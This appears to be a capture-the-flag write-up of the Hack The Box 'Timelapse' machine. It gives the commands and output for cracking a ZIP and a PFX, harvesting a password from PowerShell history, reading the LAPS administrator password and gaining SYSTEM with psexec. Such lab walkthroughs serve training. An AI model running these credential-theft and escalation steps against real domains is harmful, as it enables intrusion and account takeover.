---
title: 'HTB Timelapse - Easy'
date: 2024-05-10 19:00:00 +0000
categories: [HTB Machines]
tags: [Easy, Linux, HTB]
---
**Timelapse** is an easy HTB machine that begins with **critical files exposed in the SMB shares**. One of them is a PFX certificate that can be used to get a foothold, but not without first cracking it. Lateral Movement is possible due to **clear-text credentials hidden in PowerShell history logs**. To finish, the user we compromised can read the Domain Controller local administrator password by **exploiting the ReadLAPSPassword object permission**.

<img src="/assets/img/timelapse/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.227.113

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.227.113 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5986, 9389, 49667, 49673, 49674, 49695, 58101

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.227.113 -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695,58101

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 20:15 WEST
Nmap scan report for 10.129.227.113
Host is up (0.065s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-11 03:15:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2024-05-11T03:17:09+00:00; +8h00m03s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
58101/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-05-11T03:16:29
|_  start_date: N/A
|_clock-skew: mean: 8h00m02s, deviation: 0s, median: 8h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.72 seconds

[+] Script finished successfully
```

Appended the newly discovered domain and hostname to /etc/hosts.

```bash
echo -e "10.129.227.113\ttimelapse.htb DC01.timelapse.htb" | sudo tee -a /etc/hosts
10.129.227.113  timelapse.htb DC01.timelapse.htb
```

SMB anonymous login is enabled and we have read access to a non-default share.

```bash
netexec smb 10.129.227.113 -u "anonymous" -p "" --shares
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\anonymous: 
SMB         10.129.227.113  445    DC01             [*] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.227.113  445    DC01             Shares          READ            
SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share
```

# Exploitation

There is a ZIP file in the ‘Dev’ directory.

```bash
smbclient -N //10.129.227.113/Shares -c "ls"     
  Dev                                 D        0  Mon Oct 25 20:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 16:48:42 2021

smbclient -N //10.129.227.113/Shares -c "ls Dev/"
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021
```

Downloaded it and received an error during decompression. We don’t have the password.

```bash
smbclient -N //10.129.227.113/Shares -c "cd Dev; get winrm_backup.zip"
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (9.5 KiloBytes/sec) (average 9.5 KiloBytes/sec)

7z e winrm_backup.zip
Extracting archive: winrm_backup.zip
--    
Enter password (will not be echoed):
ERROR: Wrong password : legacyy_dev_auth.pfx
```

<img src="/assets/img/timelapse/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Converted the protected file into a hash and cracked it with JTR.

```bash
zip2john winrm_backup.zip > zip.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP

john zip.hash -w=/usr/share/wordlists/rockyou.txt
winrm_backup.zip/legacyy_dev_auth.pfx:<REDACTED>
```

This time we could decompress it without any issues.

```bash
7z e winrm_backup.zip
Enter password (will not be echoed):
Everything is Ok

Size:       2555
Compressed: 2611

ls -l              
total 16
-rwxr-xr-x 1 kali kali 2555 Oct 25  2021 legacyy_dev_auth.pfx
-rw-r--r-- 1 kali kali 2611 May 10 20:22 winrm_backup.zip
-rw-r--r-- 1 kali kali 4962 May 10 20:26 zip.hash
```

Trying to extract the private key from the PFX certificate returns another ‘invalid password’ XD.

```bash
sudo certipy-ad cert -pfx legacyy_dev_auth.pfx -nocert -out dusk.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[-] Got error: Invalid password or PKCS12 data
[-] Use -debug to print a stacktrace
```

<img src="/assets/img/timelapse/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Apparently, it was a protected PFX certificate into a protected ZIP file. John could crack it as well.

```bash
pfx2john legacyy_dev_auth.pfx > certificate.hash

john certificate.hash -w=/usr/share/wordlists/rockyou.txt
legacyy_dev_auth.pfx:<REDACTED>
```

Extracted the certificate and the private key from the PFX, providing the cracked password.

```bash
sudo certipy-ad cert -pfx legacyy_dev_auth.pfx -nocert -out dusk.key -password "<REDACTED>"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'dusk.key'

sudo certipy-ad cert -pfx legacyy_dev_auth.pfx -nokey -out dusk.crt -password "<REDACTED>"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'dusk.crt'
```

Connected as ‘legacyy’ over WinRM HTTPS and read the user flag.

```
evil-winrm --ssl -c dusk.crt -k dusk.key -i 10.129.227.113

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy

*Evil-WinRM* PS C:\Users\legacyy\Documents> hostname
dc01

*Evil-WinRM* PS C:\Users\legacyy\Documents> type c:\users\legacyy\desktop\user.txt
0d19be8761901ce4****************
```

# Lateral Movement

Listing the home directories shows that we aren’t alone in the target box.

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> dir c:\users
  Directory: C:\users
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----       10/23/2021  11:27 AM                Administrator
	d-----       10/25/2021   8:22 AM                legacyy
	d-r---       10/23/2021  11:27 AM                Public
	d-----       10/25/2021  12:23 PM                svc_deploy
	d-----        2/23/2022   5:45 PM                TRX
```

Enumerating the PowerShell history logs led us to discover Svc_deploy’s clear-text password

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString '<REDACTED>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

NetExec confirms that the credentials are valid. We are on the right track.

```bash
netexec smb 10.129.227.113 -u "svc_deploy" -p '<REDACTED>' --shares
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\svc_deploy:<REDACTED> 
SMB         10.129.227.113  445    DC01             [*] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.227.113  445    DC01             Shares          READ            
SMB         10.129.227.113  445    DC01             SYSVOL          READ            Logon server share
```

This user is also granted with PS Remote access. 

```
evil-winrm --ssl -u svc_deploy -p '<REDACTED>' -i 10.129.227.113

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> hostname
dc01
```

# PrivEsc

Let’s collect information about the domain with [bloodhound-python](https://github.com/dirkjanm/BloodHound.py).

```bash
bloodhound-python -u svc_deploy -p '<REDACTED>' -ns 10.129.227.113 -c all -d timelapse.htb
```

BH reveals that the ‘Svc_deploy’ user is **allowed to read the DC01’s local administrator password**. 

<img src="/assets/img/timelapse/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Used [pyLAPS](https://github.com/p0dalirius/pyLAPS) to read it.

```bash
python3 pyLAPS.py -d timelapse.htb -u svc_deploy -p '<REDACTED>' -a get --dc-ip 10.129.227.113
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC01$                : <REDACTED>
[+] All done!
```

Finally, connected as SYSTEM in the Domain Controller and read the root flag. GGs!

```
impacket-psexec administrator:'<REDACTED>'@10.129.227.113

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
dc01

C:\Windows\system32> type c:\users\TRX\desktop\root.txt
6a0ed86eb8a3a7ac****************
```